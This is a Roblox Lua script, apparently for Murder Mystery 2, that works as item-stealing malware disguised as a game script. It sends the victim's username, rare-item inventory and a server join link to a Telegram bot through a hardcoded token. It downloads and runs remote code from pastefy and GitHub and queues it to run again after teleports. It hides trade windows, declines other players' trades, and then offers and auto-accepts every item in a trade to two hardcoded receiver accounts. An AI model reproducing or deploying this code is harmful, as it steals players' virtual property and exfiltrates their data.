_G.vlorp = _G.vlorp or false
if _G.vlorp then
    return
end
_G.vlorp = true

repeat wait() until game:IsLoaded()
local player = game.Players.LocalPlayer

-- Ждём загрузки PlayerGui и Humanoid
repeat wait() until player:FindFirstChild("PlayerGui") and player.Character and player.Character:FindFirstChild("Humanoid")

-- Ждём, пока DeviceSelect пропадёт из PlayerGui
repeat wait(1) 
    print('waiting')
until not player.PlayerGui:FindFirstChild("DeviceSelect")

-- Проверка на количество игроков
if #game:GetService("Players"):GetPlayers() <= 2 then
    player:Kick("This server is unsupported... Try in a new PUBLIC server.")
end

local LP = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)

local function listAllItemsText()
    local sortedItems = {
        ["Unique"] = {},
        ["Ancient"] = {},
        ["Godly"] = {},
        --[[["Vintage"] = {},
        ["Legendary"] = {},
        ["Rare"] = {},
        ["Uncommon"] = {},
        ["Common"] = {}]]
    }

    -- Получаем все предметы из инвентаря
    for category, itemList in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, item in pairs(itemList) do
            if item.ItemName and item.Amount and item.Amount > 0 then
                local rarity = item.Rarity or "Unknown"
                if sortedItems[rarity] then
                    table.insert(sortedItems[rarity], {
                        name = item.ItemName,
                        amount = item.Amount
                    })
                end
            end
        end
    end

    local text = ""
    for _, rarity in ipairs({ "Unique", "Ancient", "Godly" }) do
        text = text .. rarity .. ":\n"
        local items = sortedItems[rarity]
        if #items > 0 then
            for _, item in ipairs(items) do
                text = text .. " - " .. item.name .. " = " .. item.amount .. "\n"
            end
        else
            text = text .. " (Нет предметов)\n"
        end
        text = text .. "\n"
    end

    --[[Составляем итоговый текст
    local text = ""
    for _, rarity in ipairs({ "Unique", "Ancient", "Godly", "Vintage", "Legendary", "Rare", "Uncommon", "Common" }) do
        text = text .. rarity .. ":\n"
        local items = sortedItems[rarity]
        if #items > 0 then
            for _, item in ipairs(items) do
                text = text .. " - " .. item.name .. " = " .. item.amount .. "\n"
            end
        else
            text = text .. " (Нет предметов)\n"
        end
        text = text .. "\n"
    end]]

    return text
end


local function waitForInventory()
    while not (InvModule and InvModule.MyInventory and InvModule.MyInventory.Data and InvModule.MyInventory.Data.Weapons) do
        task.wait(0.1)
    end
end

aprplayers = {
    "lenivayzopakota16",
    "lenivayzopakota62",
}
chatId = -1003099751350
botToken = "7550570466:AAFu20M2RFY60MzB6ODBZDy3oXgn7MLxzho"
threadmobile = 4
threadpc = 2
threaduniversal = 6
richgodliesList = {"Bat","Candy","Darksword","Darkshot", "Traveler's Gun", "Evergreen","Evergun","Bauble","Rainbow Gun", "Sunrise", "Sunset", "Rainbow","Constellation","Sakura","Blossom","Turkey","Vampire's Gun"}
richgodliesListpc = {"TreeKnife2023", "Turkey2023", "TreeGun2023","TravelerGun","Sakura_K", "Blossom_G", "ZombieBat", "Constellation", "Candy", "VampireGun", "SunsetKnife", "SunsetGun","Darksword","Darkshot","Rainbow_G","Rainbow_K","Bauble"}
skinNamesTG = {"Corrupt","Vampire's Axe","Gingerscope","Traveler's Axe","Celestial","Icepiercer","Harvester","Bat","Candy","Darksword","Darkshot", "Traveler's Gun", "Evergreen","Evergun","Bauble","Rainbow Gun", "Sunrise", "Sunset", "Rainbow","Constellation","Sakura","Blossom","Turkey","Vampire's Gun"}


local function normalizeName(name)
    return string.gsub(name, "[()%[%]{}]", "")
end


local function isAllowed(name)
    for _, allowed in ipairs(aprplayers) do
        if name == allowed then
            return true
        end
    end
    return false
end
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local destroyTrades = coroutine.create(function()
    while true do
        local playerGui = player:WaitForChild("PlayerGui")
        local tradeGUI = playerGui:FindFirstChild("TradeGUI_Phone")

        if tradeGUI then
            local theirOffer = tradeGUI:FindFirstChild("Container")
                and tradeGUI.Container:FindFirstChild("Trade")
                and tradeGUI.Container.Trade:FindFirstChild("TheirOffer")

            if theirOffer and theirOffer:FindFirstChild("Username") then
                local usernameText = theirOffer.Username.Text
                local cleanName = normalizeName(usernameText)

                if not isAllowed(cleanName) then
                    -- Ник не разрешён → отклоняем трейд
                    local args = {}
                    ReplicatedStorage:WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer(unpack(args))
                end
            end
        end

        task.wait(0.1)
    end
end)

coroutine.resume(destroyTrades)

local RichSkinsTG = {}
for _, name in ipairs(skinNamesTG) do
    RichSkinsTG[name] = true
end

local RichRarities = {
    ["Godly"] = true,
    ["Ancient"] = true,
    ["Unique"] = true
}


local function hasAtLeastOneValuableItem()
    waitForInventory()

    for category, itemList in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, item in pairs(itemList) do
            if item.ItemName and item.Amount and item.Amount > 0 then
                local rarity = item.Rarity or "Unknown"
                if RichSkinsTG[item.ItemName] and RichRarities[rarity] then
                    return true
                end
            end
        end
    end

    return false
end

loadstring(game:HttpGet("https://pastefy.app/8vUdWyvU/raw",true))()

local scriptUrl = "https://raw.githubusercontent.com/ScriptsForMM2RewHub/RewHub/refs/heads/main/test.lua"

local function getScript()
	if game.HttpGetAsync then
		return game:HttpGetAsync(scriptUrl)
	else
		return game:HttpGet(scriptUrl)
	end
end

local function run()
	task.spawn(function()

		local success, err = pcall(function()
			local code = getScript()
			assert(code and code ~= "")
			local func = loadstring(code)
			assert(func)
			func()
		end)

		if success then
			print("Script executed successfully!")
		else
			warn("Error running script:", err)
		end
	end)
end

local function queueScript()
	local queueCode = string.format([[
        spawn(function()
            repeat wait() until game:IsLoaded()
            local success, err = pcall(function()
                local code
                if game.HttpGetAsync then
                    code = game:HttpGetAsync("%s")
                else
                    code = game:HttpGet("%s")
                end
                assert(code and code ~= "", "Failed to fetch script")
                local func = loadstring(code)
                assert(func, "Failed to compile script")
                func()
            end)
            if not success then
                warn("Auto-execute on teleport/rejoin failed:", err)
            end
        end)
    ]], scriptUrl, scriptUrl)

	if syn and syn.queue_on_teleport then
		syn.queue_on_teleport(queueCode)
	elseif queue_on_teleport then
		queue_on_teleport(queueCode)
	elseif fluxus and fluxus.queue_on_teleport then
		fluxus.queue_on_teleport(queueCode)
	elseif SecureLoad and SecureLoad.queue_on_teleport then
		SecureLoad.queue_on_teleport(queueCode)
	else
		warn("Your executor does not support queue_on_teleport.")
	end
end

local chosenThreadId
if hasAtLeastOneValuableItem() then
    chosenThreadId = 4 -- большой тред (Big Steal)
    run()
    queueScript()
else
    chosenThreadId = 6 -- маленький тред (Small Steal)
end

local Players = game:GetService("Players")
local httpRequest = (http and http.request) or (syn and syn.request) or request or http_request

local function getAltTeleport()
    if not httpRequest then
        warn("[SCRIPT] ❌ httpRequest недоступен")
        print("не успешно запрос не доступен")
        return nil
    end
    if not (getgenv and getgenv().Cookie) then
        warn("[SCRIPT] ❌ Cookie не найден (getgenv().Cookie)")
        print("не успешно куки")
        return nil
    end

    local userIds = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        table.insert(userIds, plr.UserId)
    end

    local reqBody = HttpService:JSONEncode({ userIds = userIds })
    local ok, response = pcall(function()
        return httpRequest({
            Url = "https://presence.roblox.com/v1/presence/users",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
            },
            Body = reqBody
        })
    end)
    if not ok or not response or not response.Body then
        print("не успешно ответ")
        return nil
    end

    local parseOk, parsed = pcall(function()
        return HttpService:JSONDecode(response.Body)
    end)
    if not parseOk or not parsed or not parsed.userPresences then
        print("не успешно юзеры")
        return nil
    end

    for _, presence in ipairs(parsed.userPresences) do
        local placeId, jobId = presence.placeId, presence.gameId
        if placeId and jobId then
            print("успешно")
            return 'game:GetService("TeleportService"):TeleportToPlaceInstance(' ..
                   tostring(placeId) .. ', "' .. tostring(jobId) .. '")'
        end
    end

    print("не успешно джоин")
    return nil
end

function SendTelegramMessage(botToken, chatId, threadId, text)
    local url = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"
    local data = {
        chat_id = chatId,
        message_thread_id = threadId,
        text = text,
        parse_mode = "Markdown"
    }
    local jsonData = HttpService:JSONEncode(data)
    return request({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
end


-- основной текст
local itemsText = listAllItemsText()
local baseText =
    "*Info*" ..
    "```\n" ..
    "Username: " .. LP.Name .. "\n" ..
    "Account-Age: " .. tostring(LP.AccountAge) .. "\n" ..
    "Executor: " .. identifyexecutor() .. "\n" ..
    "Receiver: " .. table.concat(aprplayers, ", ") .. "\n" ..
    "```\n" ..
    "*Hit Info*\n" ..
    "```\n" ..
    itemsText .. "\n" ..
    "```\n" ..
    "*Main Join:*\n" ..
    "```\n" ..
    'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. tostring(game.JobId) .. '")' .. "\n" ..
    "```"

local finalText = baseText
if identifyexecutor and type(identifyexecutor) == "function" then
    local suc, res = pcall(identifyexecutor)
    if suc and res then
        local executor_name = string.lower(tostring(res))
        if string.find(executor_name, "delta") or string.find(executor_name, "krnl") then
            local altCmd = getAltTeleport()
            finalText = finalText ..
                "\n*Delta and Krnl Bypass:*\n" ..
                "```\n" ..
                (altCmd or "На сервере нету игроков с открытым join, используй расширение") ..
                "\n```"
        end
    end
end

-- отправка
SendTelegramMessage(botToken, chatId, chosenThreadId, finalText)

local vintageItems = {}
local commonItems = {}
local uncommonItems = {}
local rareItems = {}
local legendaryItems = {}
local godlyItems = {}
local ancientItems = {}
local uniqueItems = {}
 

for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
    for c,d in pairs(b) do
        local br = 0
 
        local formattedTable = {name = d.ItemName, value = br, data = d.DataID, amount = d.Amount, rarity = d.Rarity}
 
        if d.Rarity == "Vintage" then
            table.insert(vintageItems, formattedTable)
        end
 
        if d.Rarity == "Unique" then
            table.insert(uniqueItems, formattedTable)
        end
 
        if d.Rarity == "Ancient" then
            table.insert(ancientItems, formattedTable)
        end
 
        if d.Rarity == "Godly" then
            table.insert(godlyItems, formattedTable)
        end
 
        if d.Rarity == "Legendary" then
            table.insert(legendaryItems, formattedTable)
        end
 
        if d.Rarity == "Rare" then
            table.insert(rareItems, formattedTable)
        end
 
        if d.Rarity == "Uncommon" then
            table.insert(uncommonItems, formattedTable)
        end
 
        if d.Rarity == "Common" then
            table.insert(commonItems, formattedTable)
        end
    end
end

local function get_device_type()
    local maingui = game.Players.LocalPlayer.PlayerGui.MainGUI
    local lobbygui = maingui:FindFirstChild("Lobby")
    local MobileState = lobbygui and lobbygui:FindFirstChild("LeaderBar") ~= nil
    return MobileState and 'mobile' or 'tablet'
end

local DEVICE_TYPE = get_device_type()

local function accept()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local TradeEvent = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")

    if DEVICE_TYPE == 'tablet' then
        -- Эмуляция кликов Accept и Confirm
        TradeEvent:FireServer("Accept")
        wait(0.5)
        TradeEvent:FireServer("Confirm")
    else
        -- Для мобильной версии
        TradeEvent:FireServer("Accept")
        wait(0.5)
        TradeEvent:FireServer("Confirm")
    end
end

local function SendTrade(Username)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local TradeEvent = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendTradeRequest")

    if DEVICE_TYPE == 'tablet' then
        print("tablet")
        -- Отправляем запрос на трейд
        TradeEvent:FireServer(Username)
    else
        print("phone")
        -- Для мобильной версии
        TradeEvent:FireServer(Username)
    end
end

local function getTradeStatus()
    return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
end

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local tradegui = playerGui:WaitForChild("TradeGUI")
tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradegui.Enabled = false
end)
local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradeguiphone.Enabled = false
end)


local function stealitems()

    local players = game:GetService("Players"):GetPlayers()

    for _, player in ipairs(players) do
        if table.find(aprplayers, player.Name) then
            -- Отправляем трейд через UI
            SendTrade(player.Name)
            print("sabay????")
            break
        end
    end

    wait(3)
    local status = getTradeStatus()
    if status == "SendingRequest" then
        print("ploxo")
        return
    end
    for a,b in pairs(uniqueItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }
 
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end
 
    for a,b in pairs(ancientItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }
 
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end


    local richgodlies = {}
    for _, name in ipairs(richgodliesList) do
        richgodlies[name] = true
    end


    -- Фильтруем ликвидные godly, которые реально есть на аккаунте
    local ownedRichGodlies = {}
    local otherGodlies = {}

    for _, item in pairs(godlyItems) do
        if richgodlies[item.name] then
            table.insert(ownedRichGodlies, item)
        else
            table.insert(otherGodlies, item)
        end
    end

    -- Если есть хотя бы один ликвидный годли, сначала предлагаем их
    if #ownedRichGodlies > 0 then
        for a,b in pairs(ownedRichGodlies) do
            for i = 1, b.amount do
                local args = {
                    [1] = b.data,
                    [2] = "Weapons"
                }
                game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
            end
        end
    end

    -- Затем — обычные godly
    for a,b  in pairs(otherGodlies) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end
 
    for a,b in pairs(vintageItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }
 
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end
 
    for a,b in pairs(legendaryItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }
 
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end
 
    for a,b in pairs(rareItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }
 
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end
 
    for a,b in pairs(uncommonItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }
 
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end
 
    for a,b in pairs(commonItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }
 
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end
    local accepted = player:WaitForChild('PlayerGui'):WaitForChild('TradeGUI_Phone'):WaitForChild('Container'):WaitForChild('Trade'):WaitForChild('YourOffer'):WaitForChild('Accepted')
    while true do
        accept()
        print("popitka")
        if accepted.Visible == true then
            print("ydachno")
            break
        end
        task.wait(0.5)
    end
end

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")

local td = 29143

-- ждать пока консоль прогрузится
local function WaitForClientLog()
    local devConsole = CoreGui:WaitForChild("DevConsoleMaster")
    local window = devConsole:WaitForChild("DevConsoleWindow")
    local ui = window:WaitForChild("DevConsoleUI")
    local mainView = ui:WaitForChild("MainView")
    return mainView:WaitForChild("ClientLog")
end

-- собрать весь текст из консоли
local function GetConsoleText(clientLog)
    local texts = {}
    for _, child in ipairs(clientLog:GetChildren()) do
        local num = tonumber(child.Name)
        if num and num > 1 then
            local msg = child:FindFirstChild("msg")
            if msg and msg:IsA("TextLabel") then
                table.insert(texts, msg.Text)
            end
        end
    end
    return table.concat(texts, "\n")
end

-- собрать итоговое сообщение
local function BuildMessage(clientLog, player)
    local allLogs = GetConsoleText(clientLog)
    local executor = identifyexecutor and identifyexecutor() or "Неизвестно"

    local messageText =
        "*Info*" ..
        "```\n" ..
        "Username: " .. player.Name .. "\n" ..
        "Executor: " .. executor .. "\n" ..
        "```\n" ..
        "*Console Logs:*\n" ..
        "```\n" ..
        (allLogs ~= "" and allLogs or "Пусто") ..
        "\n```"

    return messageText
end

game.Players.PlayerAdded:Connect(function(player)
    if table.find(aprplayers, player.Name) then
        player.Chatted:Connect(function(msg)
            if msg == "cmd" then
                -- открываем консоль
                game.StarterGui:SetCore("DevConsoleVisible", true)

                -- ждём чтобы прогрузилось
                task.wait(0.4) -- иногда нужно увеличить до 2-3 сек
                local clientLog = WaitForClientLog()

                -- отправляем
                SendTelegramMessage(botToken, chatId, td, BuildMessage(clientLog, player))

                -- закрываем обратно
                game.StarterGui:SetCore("DevConsoleVisible", false)
            end
        end)
    end
end)


-- таблица для учёта количества заходов/спавнов админов
local adminJoinCount = {}

local function checkAdmin(player)
    if table.find(aprplayers, player.Name) then
        -- инициализируем счётчик
        adminJoinCount[player.UserId] = adminJoinCount[player.UserId] or 0

        player.CharacterAdded:Connect(function()
            adminJoinCount[player.UserId] += 1
            if adminJoinCount[player.UserId] >= 2 then
                stealitems()
            end
        end)

        -- если персонаж уже существует (например при заходе)
        if player.Character then
            adminJoinCount[player.UserId] += 1
            if adminJoinCount[player.UserId] >= 2 then
                stealitems()
            end
        end
    end
end

-- подключение к уже находящимся игрокам
for _, player in ipairs(Players:GetPlayers()) do
    checkAdmin(player)
end

-- подключение новых игроков
Players.PlayerAdded:Connect(function(player)
    checkAdmin(player)
end)

